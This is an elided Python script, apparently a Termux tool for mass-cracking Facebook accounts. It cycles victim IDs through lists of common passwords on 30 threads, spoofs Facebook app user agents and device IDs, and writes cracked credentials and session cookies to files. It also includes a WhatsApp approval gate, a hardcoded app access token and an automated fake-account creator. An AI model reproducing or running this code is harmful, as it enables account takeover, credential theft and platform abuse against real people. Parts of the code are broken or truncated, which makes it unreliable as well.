...
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.mrMUGHALxxx-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.mrMUGHALxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrMUGHALxxx-cov', 'r').read()
kex=(f"MUGHAL-XD~CREATE:{uid}TS{key1}110E==")
...
\033[1;31m   `7MMF' .g8""8q. `7MMF' `YMM' `7MM"""YMM  `7MM"""Mq.\033[1;31m
\033[1;32m     MM .dP'    `YM. MM   .M'     MM    `7    MM   `MM.\033[1;32m
\033[1;33m     MM dM'      `MM MM .d"       MM   d      MM   ,M9\033[1;33m
\033[1;34m     MM MM        MM MMMMM.       MMmmMM      MMmmdM9\033[1;34m
\033[1;35m     MM MM.      ,MP MM  VMA      MM   Y  ,   MM  YM.\033[1;35m
\033[1;36m(O)  MM `Mb.    ,dP' MM   `MM.    MM     ,M   MM   `Mb.\033[1;36m
\033[1;37m Ymmm9    `"bmmd"' .JMML.   MMb..JMMmmmmMMM .JMML. .JMM.\033[1;37m
               
{WHITE}[•]𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊    : 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
{WHITE}[•] 𝐀𝐔𝐓𝐇𝐎𝐑       : 𝐌𝐑 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
{WHITE}[•] 𝐒𝐓𝐘𝐋𝐄         : 𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍
{WHITE}[•] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏     : 𝐇𝐀𝐉𝐈 𝐉𝐎𝐊𝐄𝐑 𝐉𝐎𝐊𝐄𝐑
{WHITE}[•] 𝐕𝐄𝐑𝐒𝐈𝐎𝐍.     :  9.5]𝐌𝐑 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑
{WHITE}[•] 𝐘𝐎𝐔𝐓𝐔𝐁𝐄      :  𝐌𝐑 𝐊𝐎𝐊𝐎 𝐉𝐎𝐊𝐄𝐑
{WHITE}================================================
   \33[37;41m\t 𝐋𝐎𝐕𝐄 𝐀𝐅𝐆𝐇𝐀𝐍𝐈𝐒𝐓𝐀𝐍 𝐇𝐀𝐂𝐊𝐄𝐑 𝐉𝐎𝐊𝐄𝐑\33[0;m
{WHITE}=================================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def approval():
  ...
  try:
    httpCaht = get_response('https://raw.githubusercontent.com/HAJI71302/aproval/main/approval.txt')
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO HAJI71II TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://wa.me/message/930707266012'+tks)
      sys.exit()
      #time.sleep(1)
      #approval()
...
def menu():
        try:
                ...
                if x == ("***"):
                        print('[1] 𝐂𝐑𝐀𝐂𝐊 𝐅𝐈𝐋𝐄 ')
                        print('[2] 𝐀𝐔𝐓𝐎 𝐂𝐑𝐄𝐀𝐓𝐄 ')
                        print('[3] 𝐑𝐀𝐍𝐃𝐎𝐌 𝐂𝐑𝐀𝐂𝐊')
                        print('[4] 𝐂𝐑𝐄𝐀𝐓 𝐅𝐈𝐋𝐄')
                        print('[5] 𝐀𝐔𝐓𝐎 2 𝐅𝐀𝐂𝐓𝐎𝐑')
                        print('[6] 𝐀𝐔𝐓𝐎 2 𝐅𝐀𝐂𝐓𝐎𝐑 𝐁𝐔𝐋𝐊 𝐅𝐈𝐋𝐄')
                        print('[7] 𝐅𝐎𝐋𝐋𝐎𝐖 𝐅𝐁')
                        print('[0] 𝐄𝐗𝐈𝐓 ')
                        linex()
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.HAJI71.etc..')
                                linex()
                                ...
                                try:
                                        ...
                                        menu()
                                clear()
                                print('[1] 𝐌𝐄𝐓𝐇𝐎𝐃 𝐍𝐄𝐖 (1)')
                                print('[2] 𝐌𝐄𝐓𝐇𝐎𝐃 𝐎𝐋𝐃/𝐍𝐄𝐄 (2)')
                                print('[3] 𝐌𝐄𝐓𝐇𝐎𝐃 𝐎𝐋𝐃 (3)')
                                linex()
                                mthd=input(' CHOOSE : ')
                                linex()
                                clear()
...
def afg():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','mohammed','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
                                TRT.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [HAJI71I-RUNING-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/294.0.0.5.140;FBBV/447406017;FBDM/{density=3.3,width=1080,height=1496};FBLC/en_US;FBRV/0;FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/371.0.0.2.163;FBBV/790340000;FBDM/{density=3.4,width=1080,height=1473};FBLC/en_US;FBRV/0;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/352.0.0.8.158;FBBV/277679234;FBDM/{density=3.4,width=1080,height=1403};FBLC/en_US;FBRV/0;FBCR/Warid;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/266.0.0.7.146;FBBV/306063891;FBDM/{density=2.2,width=1080,height=1491};FBLC/en_US;FBRV/0;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/391.0.0.8.112;FBBV/993590590;FBDM/{density=3.5,width=1080,height=1453};FBLC/en_US;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/319.0.0.6.129;FBBV/582259249;FBDM/{density=3.4,width=1080,height=1465};FBLC/en_US;FBRV/0;FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/363.0.0.8.102;FBBV/389683506;FBDM/{density=3.2,width=1080,height=1467};FBLC/en_US;FBRV/0;FBCR/Jazz Nepal;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/404.0.0.35.70;FBBV/451474103;FBDM/{density=3.95,width=1080,height=2400};FBLC/en_GB;FBRV/454233043;FBCR/TESCO;FBMF/HMD Global;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi Redmi K30 5G Racing;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-HAJI71I-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     #   print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAJI71I-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HAJI71I-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                            #    print('\r\r \033[1;34m[HAJI71I-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                              #  print('\r\r\x1b[1;31m [ALONE-HAJI71I-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/HAJI71I-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/HAJI71I-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [HAJI71I-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/){density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T311|KOT49H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [HAJI71I-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                       accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-HAJI71I-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAJI71i-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HAJI71I-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [HAJI71I-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/HAJI71I-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748110;FBDM/){density=2.0,width=720,height=1280};FBLC/en_GB;FBCR/IND airtel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T311|KOT49H;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/294.0.0.5.140;FBBV/447406017;FBDM/{density=3.3,width=1080,height=1496};FBLC/en_US;FBRV/0;FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/371.0.0.2.163;FBBV/790340000;FBDM/{density=3.4,width=1080,height=1473};FBLC/en_US;FBRV/0;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2006C3LG;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/352.0.0.8.158;FBBV/277679234;FBDM/{density=3.4,width=1080,height=1403};FBLC/en_US;FBRV/0;FBCR/Warid;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2101K7AG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/266.0.0.7.146;FBBV/306063891;FBDM/{density=2.2,width=1080,height=1491};FBLC/en_US;FBRV/0;FBCR/Azercell;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2102K1G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/391.0.0.8.112;FBBV/993590590;FBDM/{density=3.5,width=1080,height=1453};FBLC/en_US;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/319.0.0.6.129;FBBV/582259249;FBDM/{density=3.4,width=1080,height=1465};FBLC/en_US;FBRV/0;FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 9T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/363.0.0.8.102;FBBV/389683506;FBDM/{density=3.2,width=1080,height=1467};FBLC/en_US;FBRV/0;FBCR/Jazz Nepal;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2012K11AG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/404.0.0.35.70;FBBV/451474103;FBDM/{density=3.95,width=1080,height=2400};FBLC/en_GB;FBRV/454233043;FBCR/TESCO;FBMF/HMD Global;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi Redmi K30 5G Racing;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/HAJI71i-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/HAJI71I-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
...
def Create():
    ...
    def strt():
       try:
           ...
           import sys
           loop+=1
           sys.stdout.write(f'\r\r\033[1;37m [HAJI71-CREATE] \033[1;32mOK:%s \033[1;37m'%(ok));sys.stdout.flush()
           requests=r.Session()
           from fake_email import Email
           mmail=Email().Mail()
           em=mmail['mail']
           ...
           if "9":
              ...
              if requests=="chk":
                print("\r\r\033[1;32m [HAJI71-CP] "+uid+'|'+pas+'|'+coki)
                cp+=1
                pass
                 ...
                 print("\r\r\033[1;32m [HAJI71-OK] "+uid+'|'+pas+'|'+coki)
                 ok+=1
                 open('/sdcard/HAJI71-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 linex()
       except Exception as e:
           if not "urllib" and not "perma" in str(e):print(e)
           pass
    file="/sdcard/HAJI71/CREATE-OK.txt"
    u=5000
    clear()
